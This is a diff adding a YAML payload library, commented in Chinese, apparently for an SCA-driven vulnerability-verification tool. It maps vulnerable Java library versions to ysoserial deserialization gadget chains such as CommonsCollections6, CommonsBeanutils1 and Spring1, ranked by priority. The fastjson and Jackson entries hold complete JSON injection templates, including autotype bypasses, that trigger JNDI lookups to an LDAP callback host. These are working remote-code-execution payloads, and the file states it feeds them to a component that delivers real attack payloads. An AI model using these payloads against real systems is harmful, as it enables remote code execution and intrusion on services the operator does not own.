@@ -1,0 +1,234 @@
+# SCA 驱动选弹弹药库（方案 A/C 的骨架，2026-08-29）
+#
+# 用途：SCA 检出「依赖里有漏洞版本的库」后，按 (family, ecosystem, package, version_range)
+#       查出该库在当前版本下**可用的 gadget 链**，交给 D1 投放真实攻击载荷。
+#
+# kind 两类，别搞混：
+#   ysoserial —— Java 原生序列化 gadget，由 tools/ysoserial-all.jar 运行时生成字节流，
+#                base64 后投放。payload_name 必须是 ysoserial 认的链名。
+#   text      —— 文本型 gadget（fastjson / Jackson 的 @type 注入），按 template 直接构造字符串，
+#                不走 ysoserial，不走 Java 序列化。{callback} 占位符会被替换成 JNDI 回调地址。
+#
+# 依赖版本取自 `java -jar tools/ysoserial-all.jar` 输出的 Dependencies 列（实跑核对，非臆测）。
+# 新增链时必须实跑核对链名与依赖，写错链名会导致选弹成功但投出去是废弹。
+version: 1
+
+# JNDI/带外回调基址，用于 text 类 gadget 的 {callback} 占位符。
+# 留空时 text 类链仍会产出 payload，但回调地址写成占位提示（需由配置或运行时注入补全）。
+callback_base: ""
+
+chains:
+  # ---------------- commons-collections 3.x（ysoserial 依赖列：commons-collections:3.1）----------------
+  - id: cc6
+    kind: ysoserial
+    family: deserialization
+    payload_name: CommonsCollections6
+    ecosystem: maven
+    package: commons-collections:commons-collections
+    version_range: ">=3.1,<=3.2.1"
+    priority: 90
+    notes: "3.1–3.2.1 通用性最好的一条，优先选"
+
+  - id: cc1
+    kind: ysoserial
+    family: deserialization
+    payload_name: CommonsCollections1
+    ecosystem: maven
+    package: commons-collections:commons-collections
+    version_range: ">=3.1,<=3.2.1"
+    priority: 70
+    notes: "需要 JDK ≤8u71 / 7u80 等旧版本才稳，新 JDK 上常失效，故优先级低于 CC6"
+
+  - id: cc5
+    kind: ysoserial
+    family: deserialization
+    payload_name: CommonsCollections5
+    ecosystem: maven
+    package: commons-collections:commons-collections
+    version_range: ">=3.1,<=3.2.1"
+    priority: 60
+
+  - id: cc7
+    kind: ysoserial
+    family: deserialization
+    payload_name: CommonsCollections7
+    ecosystem: maven
+    package: commons-collections:commons-collections
+    version_range: ">=3.1,<=3.2.1"
+    priority: 60
+
+  - id: cc3
+    kind: ysoserial
+    family: deserialization
+    payload_name: CommonsCollections3
+    ecosystem: maven
+    package: commons-collections:commons-collections
+    version_range: ">=3.1,<=3.2.1"
+    priority: 50
+
+  # ---------------- commons-collections4（ysoserial 依赖列：commons-collections4:4.0）----------------
+  - id: cc2
+    kind: ysoserial
+    family: deserialization
+    payload_name: CommonsCollections2
+    ecosystem: maven
+    package: org.apache.commons:commons-collections4
+    version_range: ">=4.0,<=4.0"
+    priority: 85
+    notes: "走 PriorityQueue + TransformingComparator，不依赖 InvokerTransformer 的 JDK 限制"
+
+  - id: cc4
+    kind: ysoserial
+    family: deserialization
+    payload_name: CommonsCollections4
+    ecosystem: maven
+    package: org.apache.commons:commons-collections4
+    version_range: ">=4.0,<=4.0"
+    priority: 80
+
+  # ---------------- commons-beanutils（依赖列：commons-beanutils:1.9.2, commons-collections:3.1）----------------
+  - id: cb1
+    kind: ysoserial
+    family: deserialization
+    payload_name: CommonsBeanutils1
+    ecosystem: maven
+    package: commons-beanutils:commons-beanutils
+    version_range: ">=1.9.0,<=1.9.4"
+    priority: 75
+    notes: "实际还依赖 commons-collections:3.1，选弹前须过可达性判定（classpath 上两者都要在）"
+
+  # ---------------- 其它 ysoserial 常见链（依赖版本按实跑输出）----------------
+  - id: groovy1
+    kind: ysoserial
+    family: deserialization
+    payload_name: Groovy1
+    ecosystem: maven
+    package: org.codehaus.groovy:groovy
+    version_range: ">=2.3.0,<=2.4.3"
+    priority: 65
+
+  - id: rome
+    kind: ysoserial
+    family: deserialization
+    payload_name: ROME
+    ecosystem: maven
+    package: com.rometools:rome
+    version_range: ">=1.0.0,<=1.12.2"
+    priority: 60
+
+  - id: spring1
+    kind: ysoserial
+    family: deserialization
+    payload_name: Spring1
+    ecosystem: maven
+    package: org.springframework:spring-core
+    version_range: ">=4.1.0,<=4.1.4"
+    priority: 55
+    notes: "还需 spring-beans 同版本在 classpath 上"
+
+  - id: spring2
+    kind: ysoserial
+    family: deserialization
+    payload_name: Spring2
+    ecosystem: maven
+    package: org.springframework:spring-core
+    version_range: ">=4.1.0,<=4.1.4"
+    priority: 50
+    notes: "还需 spring-aop + aopalliance + commons-logging"
+
+  - id: c3p0
+    kind: ysoserial
+    family: deserialization
+    payload_name: C3P0
+    ecosystem: maven
+    package: com.mchange:c3p0
+    version_range: ">=0.9.5.0,<=0.9.5.2"
+    priority: 55
+    notes: "还需 mchange-commons-java"
+
+  - id: bsh1
+    kind: ysoserial
+    family: deserialization
+    payload_name: BeanShell1
+    ecosystem: maven
+    package: org.beanshell:bsh
+    version_range: ">=2.0.0,<=2.0.6"
+    priority: 50
+
+  - id: clojure
+    kind: ysoserial
+    family: deserialization
+    payload_name: Clojure
+    ecosystem: maven
+    package: org.clojure:clojure
+    version_range: ">=1.8.0,<=1.8.0"
+    priority: 45
+
+  - id: jython1
+    kind: ysoserial
+    family: deserialization
+    payload_name: Jython1
+    ecosystem: maven
+    package: org.python:jython-standalone
+    version_range: ">=2.5.0,<=2.5.2"
+    priority: 45
+
+  - id: hibernate1
+    kind: ysoserial
+    family: deserialization
+    payload_name: Hibernate1
+    ecosystem: maven
+    package: org.hibernate:hibernate-core
+    version_range: ">=5.0.0,<=5.4.0"
+    priority: 40
+
+  - id: json1
+    kind: ysoserial
+    family: deserialization
+    payload_name: JSON1
+    ecosystem: maven
+    package: net.sf.json-lib:json-lib
+    version_range: "*"
+    priority: 40
+    notes: "依赖较多（spring-aop / commons-beanutils / ezmorph / commons-collections 等），须过可达性判定"
+
+  # ---------------- 文本型 gadget（不走 ysoserial，不走 Java 序列化）----------------
+  - id: fastjson-jdbcrowset
+    kind: text
+    family: deserialization
+    ecosystem: maven
+    package: com.alibaba:fastjson
+    version_range: "<=1.2.24"
+    template: '{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"{callback}","autoCommit":true}'
+    priority: 95
+    notes: "fastjson ≤1.2.24 默认开启 autotype，JdbcRowSetImpl 触发 JNDI 查询；{callback} 替换为 ldap://host/<canary>"
+
+  - id: fastjson-jdbcrowset-1250
+    kind: text
+    family: deserialization
+    ecosystem: maven
+    package: com.alibaba:fastjson
+    version_range: ">=1.2.25,<=1.2.47"
+    template: '{"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"{callback}","autoCommit":true}}'
+    priority: 85
+    notes: "1.2.25–1.2.47 的 autotype 绕过（缓存 Class 绕过 checkAutotype）"
+
+  - id: fastjson-expectclass-1268
+    kind: text
+    family: deserialization
+    ecosystem: maven
+    package: com.alibaba:fastjson
+    version_range: ">=1.2.48,<=1.2.82"
+    template: '{"@type":"java.lang.AutoCloseable","@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"{callback}","autoCommit":true}'
+    priority: 55
+    notes: "expectClass 绕过面（CVE-2022-25845，≤1.2.82，2026-10-02 补齐）：以 AutoCloseable 作 expectClass 指定 JdbcRowSetImpl 触发 JNDI；须目标未开 safeMode（1.2.68 起可选加固，默认关），选弹前须过机制表 mechanism_library 的 check_depends 与自写净化器求交，验证走 OOB"
+
+  - id: jackson-defaulttyping
+    kind: text
+    family: deserialization
+    ecosystem: maven
+    package: com.fasterxml.jackson.core:jackson-databind
+    version_range: "*"
+    template: '["com.sun.rowset.JdbcRowSetImpl",{"dataSourceName":"{callback}","autoCommit":true}]'
+    priority: 60
+    notes: "仅在应用启用了 enableDefaultTyping / @JsonTypeInfo 时可用，须过可达性判定确认"
